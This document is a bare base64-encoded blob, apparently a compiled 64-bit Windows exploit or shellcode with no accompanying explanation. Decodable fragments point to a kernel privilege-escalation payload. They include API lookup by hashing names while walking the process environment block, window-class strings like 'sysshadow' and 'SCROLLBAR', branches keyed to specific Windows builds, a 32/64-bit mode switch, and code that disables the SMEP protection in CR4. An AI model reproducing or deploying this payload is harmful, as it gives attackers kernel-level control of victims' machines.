IiX4oi9hIi01AQf9XSIXbeDtIi01QQf9XQEiLUDBIiVX4SIXSdCBBuQCAAABMjUXwSI1V+EmLzEH/VyhIi1VQSYvMQf9XOEG+AQAAAEGLxkiDxGBBX0FeQVxfXltdw8zMSIlcJAhIiWwkEEiJdCQYV0iD7CCDeVAHSYvoSIvaSIv5fWtIhdJ0ZkiLyv9XQItIKEiFyXQQRTPASI0EGUiLy0GNUAH/0GVIiwQlYAAAAEiLSBhIi3EQSIveSIXbdB1Ig3swAHQWSItLYEiL1f9XEIXAdApIixtIO/N13jPbgUNoAEAIALj//wAAZolDbEiLXCQwSItsJDhIi3QkQEiDxCBfw8xIiVwkEEyJRCQYVVZXQVRBVkiL7EiD7EBIi/JIi/lIjVFUSIvO/1cQRTPkSI2XjAAAAIXASIvOi9hBD5TE/1cQRTP2hcBBD5TGhdt0CUWF9nUEM9vrGEiL1kiLz7sBAAAA6Ar+//+FwA+EnAAAAEiDZUAASIvOSIl16P9XCEyNTUAz0mYDwEyNReBmiUXgM8lmg8ACZolF4v8XSIN9QAB0WoXbdFZFheR0BkiNX27rEEiNn6IAAABFhfZ1BEiLXUBIg2UwAEiLy0iJXfj/VwhMjU0wM9JmA8BMjUXwZolF8DPJZoPAAmaJRfL/F0iLVTBMi8NIi8/oYf7//0iLVUBMi8ZIi8/oUv7//0iLXCR4SIPEQEFeQVxfXl3DAAAAAABVi+xTVlcO6AUAAABfXlvJw2gzAMsA6Pn///9BVUyL7GVIiwQlMAAAAEiLYAhAgOTwSIPsIGVIiwQlYAAAAEiLQBhIi0AwSItAEEiLyItVCOgkAAAAi1UMSIkCSYvlQV3LM/8zwKyEwHQNPGF8Aiwgwc8NA/jr7JfD/FJXVkiH0UiNcjxIM8Cti4QQiAAAAEiNBBBEi0AkTAPCRItIHEwDyotYIEgD2kSLWBhB/8tKjQSbizBIA/Lopf///zvBdAdB/8t16esPSw+3NFhBizyxSI0EF+sDSDPAXl9awwAAAEiNFfn///9VU1ZXUUiL6kiJpWICAABAgOTwSIHsgAAAAGVIizwlYAAAAEiLfxhIi38wSItXEEiLd0BIiz9mg34YAHXuSLtrZXJuZWwzMqyEwHUFrITAdNo8YXMGPDl2AgQgOsN1zEjB6wh14kiNtXoCAABIjb1qAgAA6NABAABIjY0ABAAASIlMJGBIjXE8rUiNXAgYSItMJGDoIwAAAEiLTCRg6JgAAABIi0wkYItTEEgD0UiLpWICAABZX15bXf/iSIvxSCtzGEiF9nRySIl0JEBIjUNwi3gshf90YkiJfCQwi0AoSAPBSIlEJDiLUARIjXQQ/kiJdCQoSI1QCEg7VCQodygPtzJmi/5mgecA8HQVZoHm/w+LOEgD90gD8UiLfCRASAE+SIPCAuvRSIvCSIt0JDBIK1QkOEg71nKuw0yJZCQITIlsJBBIg+xISI1DcIt4CIX/dG1IA/lIh/GLRwyFwHRgSAPGSIvI/5VqAgAASIXAdElMi+hMi+aDfwQAdQiLVxBMA+LrBYsXTAPiSYsMJEiFyXQnagFa0cqFynQG/8oj0esFSI1UDgJJi83/lXICAABJiQQkSYPECOvQSIPHFOuZSIPESEyLbCQQTItkJAjDM/8zwKyEwHQNPGF8Aiwgwc8NA/jr7JfD/FJXVkiNcjxIM8Cti4QCiAAAAEiNBAJEi0AkTAPCRItIHEwDyotYIEgD2kSLWBhB/8tKjQSbizBIA/LoqP///zvBdAdB/8t16esPSw+3NFhBizyxSI0EOusDSDPAXl9aw609u7u7u3QKkeiR////SKvr7sMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB2RouKeu7KGru7u7sAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC4NAAAAAAAAAAAAIABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKhEAAB4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE4AACQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApDsAAAAEAAAAPAAAAAQAAAAAAAAAAAAAAAAAACAAAOAAAAAAAAAAAOABAAAAQAAAAAIAAABAAAAAAAAAAAAAAAAAAABAAABAAAAAAAAAAABSCwAAAEIAAAAMAAAAQgAAAAAAAAAAAAAAAAAAQAAAQAAAAAAAAAAAJAAAAABOAAAAAgAAAE4AAAAAAAAAAAAAAAAAAEAAAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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